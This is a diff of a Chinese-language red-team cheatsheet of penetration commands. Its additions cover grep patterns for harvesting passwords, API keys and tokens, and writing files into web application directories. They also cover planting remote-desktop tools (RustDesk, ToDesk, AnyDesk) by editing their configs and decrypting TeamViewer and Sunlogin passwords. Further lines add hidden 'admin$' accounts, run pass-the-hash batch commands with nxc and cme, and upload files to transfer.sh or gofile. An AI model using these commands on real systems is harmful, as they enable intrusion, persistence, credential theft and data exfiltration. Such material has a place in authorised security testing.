@@ -2,9 +2,10 @@
 收集渗透中会用到的常用命令  。
 
 
+red team cheatsheets.       
+
 
 建议直接[Ctrl+F]查找    
-
 
 ## java命令执行
 如下编码网站：
@@ -105,11 +106,118 @@ $IFS$9
 %09
 ```
 
-## windows打包目录
+windows特性执行命令
+```
+who''ami
+```
+
+## 文件搜索
+https://www.anquanke.com/post/id/245019
+
+```
+findstr /s /i /n /d:C:\ /c:"123123" *.txt
+```
+
+```
+for /r C: %i in (login.*) do @echo %i
+```
+
+```
+where /R C: login.*
+```
+
+```
+dir /s/a-d/b login.*
+```
+
+```
+find / -name index.php
+```
+
+```
+find / -name index.php
+```
+
+```
+find / -name "index.php" | xargs grep "111222"
+```
+
+```
+updatedb && locate index.php
+```
+
+进程路径
+```
+
+wmic process get name,executablepath
+```
+
+
+windows打包目录
 
 ```
 powershell -Command "Compress-Archive -Path E:\update\ -DestinationPath E:\test.zip"
 ```
+
+程序名找启动路径
+```
+wmic process where name='mysqld.exe' get processid,executablepath,name
+```
+程序pid找路径
+```
+wmic process get name,executablepath,processid|findstr pid
+```
+
+启动路径找login.jsp
+```
+for /f %i in ('dir /s /b D:\UFGOV\U8\login.jsp') do (echo %i)
+```
+
+base64分段不换行追加写文件
+```
+echo|set /p=\"PCFET0NUWVBFIGh0bWw+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PGgxPjIwMjHlubR4eHjnvZHnu5zlronlhajlrp7miJjmvJTnu4M8L2gxPg==\" > D:\UFGOV\U8\webapps\demonstrate.txt
+```
+
+解决cmd无回显问题
+```
+powershell Get-ChildItem C:
+```
+
+
+### grep搜索
+
+```
+grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}" -r xxx --color=auto
+```
+
+```
+grep -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" -r xxx --color=auto
+```
+
+```
+grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
+```
+
+```
+grep -ohr -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" /app/ |sort|uniq >> test.txt
+```
+
+web应用
+```
+grep -EHirn '--include=*.'{java,jsp,jspx,xml,conf,json,ini,properties,yaml,toml,plist,txt,sql} "accesskey|api_key|apikey|jdbc|username|pass|passwd|password" webapps/
+```
+
+搜索文件内的字符串
+```
+grep -r "test" ./src
+
+显示行号
+grep -rn "test" ./src
+```
+
+
+
+
 
 ## 匿名文件存储
 可用命令行   
@@ -123,6 +231,9 @@ curl --upload-file ./hello.txt https://transfer.sh/hello.txt
 https://transfer.sh/fF6OA7aF8o/hello.txt
 
 ```
+
+日常使用
+https://gofile.io/
 
 
 ## nbtscan
@@ -610,6 +721,54 @@ https://github.com/lz520520/Stowaway
 https://github.com/Dliv3/Venom
 
 
+## 内网远程控制工具
+
+图形化界面比较好操作一点，还可以直接关杀软。
+
+### rustdesk
+老版本便携版，可以直接编辑配置文件，填入明文密码。新版本，可以自己本地生成好，传上去。
+```
+配置文件位置
+C:\Users\administrator\AppData\Roaming\RustDesk\config
+```
+
+### gotohttp
+无敌，就是需要能出网，直接网页控制
+https://gotohttp.com/
+运行后，当前目录就会生成配置文件，里面包含明文的id和密码，然后打开网页直接连接。
+
+
+### todesk
+便携版
+tempAuthPassEx是连接密码，本地生产，替换。重启生效
+```
+便携版
+C:\ProgramData\ToDesk_Lite\config.ini
+安装版
+C:\Program Files\ToDesk\config.ini
+```
+
+
+### AnyDesk
+本地生成配置后，传输上去替换。没临时密码，需要设置一个固定密码再传上去。
+```
+C:\Users\administrator\AppData\Roaming\AnyDesk
+```
+
+### TeamViewer
+老版本11-15，直接解密
+https://github.com/uknowsec/SharpDecryptPwd
+
+
+### sunlogin向日葵
+配置文件中的，密码可以解密。也有便携版。
+```
+C:\Program Files\Oray\SunLogin\SunloginClient\config.ini [默认路径]
+```
+
+
+其他，也可以用各个厂商的云助手来控制。成本有点高，但是免杀效果好。看个人需求选择。
+
 
 ## ssh
 无记录shell
@@ -617,38 +776,6 @@ https://github.com/Dliv3/Venom
 ```
  ssh -T root@192.168.1.1 /usr/bin/bash -i
 ```
-
-## grep搜索
-
-```
-grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}" -r xxx --color=auto
-```
-
-```
-grep -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" -r xxx --color=auto
-```
-
-```
-grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
-```
-
-```
-grep -ohr -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" /app/ |sort|uniq >> test.txt
-```
-
-web应用
-```
-grep -EHirn '--include=*.'{java,jsp,jspx,xml,conf,json,ini,properties,yaml,toml,plist,txt,sql} "accesskey|api_key|apikey|jdbc|username|pass|passwd|password" webapps/
-```
-
-搜索文件内的字符串
-```
-grep -r "test" ./src
-
-显示行号
-grep -rn "test" ./src
-```
-
 
 ## mysql
 
@@ -886,30 +1013,7 @@ for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war') do (del %i\finddir.tx
 find /root -name war|while read file;do sh -c "echo $file">$file/finddir.txt;done
 
 ```
- 程序名找启动路径
-```
-wmic process where name='mysqld.exe' get processid,executablepath,name
-```
-程序pid找路径
-```
-wmic process get name,executablepath,processid|findstr pid
-```
-
-启动路径找login.jsp
-```
-for /f %i in ('dir /s /b D:\UFGOV\U8\login.jsp') do (echo %i)
-```
-
-base64分段不换行追加写文件
-```
-echo|set /p=\"PCFET0NUWVBFIGh0bWw+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PGgxPjIwMjHlubR4eHjnvZHnu5zlronlhajlrp7miJjmvJTnu4M8L2gxPg==\" > D:\UFGOV\U8\webapps\demonstrate.txt
-```
-
-解决cmd无回显问题
-```
-powershell Get-ChildItem C:
-```
-
+ 
 
 ## hydra
 
@@ -981,6 +1085,12 @@ useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
 ```
 
 ### windows添加用户
+
+bypass
+https://github.com/lengjibo/NetUser
+https://github.com/crisprss/BypassUserAdd
+
+正常添加
 ```
 net user admin$ Afabab@20 /add
 net localgroup administrators admin$ /add
@@ -1074,7 +1184,7 @@ plugin = socks5
 - 流量特征明显
 - 会被av直接秒
 - 有可能会导致目标脱域
-- 代理不稳，容易出问题
+- 代理不稳，容易出问题（要发很多个包去试）
 
 
 
@@ -1178,46 +1288,7 @@ netstat -an|find "3389"
 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0
 ```
 
-## 文件搜索
-https://www.anquanke.com/post/id/245019
 
-```
-findstr /s /i /n /d:C:\ /c:"123123" *.txt
-```
-
-```
-for /r C: %i in (login.*) do @echo %i
-```
-
-```
-where /R C: login.*
-```
-
-```
-dir /s/a-d/b login.*
-```
-
-```
-find / -name index.php
-```
-
-```
-find / -name index.php
-```
-
-```
-find / -name "index.php" | xargs grep "111222"
-```
-
-```
-updatedb && locate index.php
-```
-
-
-```
-进程路径
-wmic process get name,executablepath
-```
 ## 命令执行无回显外带oob
 #### Windows
 在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后荣国certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。
@@ -1794,7 +1865,6 @@ sc \\192.168.210.107 start hacker      #启动hacker服务
 | **Atexec**   | 445 (RPC)  | ⭐⭐⭐        | ⭐⭐⭐          | **中** (计划任务日志)      |
 | **Wmiexec**  | 135 + 动态端口 | ⭐⭐         | ⭐⭐⭐⭐         | **低** (WmiPrvSE子进程) |
 | **Dcomexec** | 135 + 动态端口 | ⭐⭐         | ⭐⭐⭐⭐⭐        | **极低** (合法进程调用)     |
-|              |            |            |              |                     |
 
 445为smb端口   
 135为rpc端口，可以用dcom和wmi  
@@ -1904,6 +1974,7 @@ shell for /f %i in (tip.txt) do ping -n 1 -w 10 %i | find /i "ttl" >nul && echo 
 shell for /f %i in (ok.txt) do dir \\%i\c$\users >>result.txt
 ```
 
+
 cme 批量
 ```
 proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d xx.org -x "net user"
@@ -1948,9 +2019,9 @@ python -m pip install --upgrade pip
 安装
 ```
 
-python3 -m pip install --user pipx
-python3 -m pipx ensurepath
-python3 -m pipx install git+https://github.com/Pennyw0rth/NetExec
+python -m pip install --user pipx
+python -m pipx ensurepath
+python -m pipx install git+https://github.com/Pennyw0rth/NetExec
 
 安装失败就直接用pip
 python -m pip install --upgrade pip
@@ -1972,7 +2043,32 @@ nxc smb 192.168.1.50 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6c
 
 nxc smb 192.168.1.50 -d test -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' -x 'whoami'
 
+批量
+nxc smb ips.txt -u admin -H '00000000000000000000000000000000:31d6cfe0d16ae931b73c59d7e0c089c0' -x 'whoami'
 
+
+执行的结果，包含Pwn3d! 表示有戏
+
+包含guest，表示smb能匿名访问
+
+```
+
+
+默认wmi，可加--exec-method 尝试别的
+```
+nxc has three different command execution methods:
+
+- `wmiexec` executes commands via WMI
+- `atexec` executes commands by scheduling a task with windows task scheduler
+- `smbexec` executes commands by creating and running a service
+
+By default nxc will fail over to a different execution method if one fails. It attempts to execute commands in the following order:
+
+1. `wmiexec`
+2. `atexec`
+3. `smbexec`
+
+If you want to force nxc to use only one execution method you can specify which one using the `--exec-method` flag.
 ```
 
 
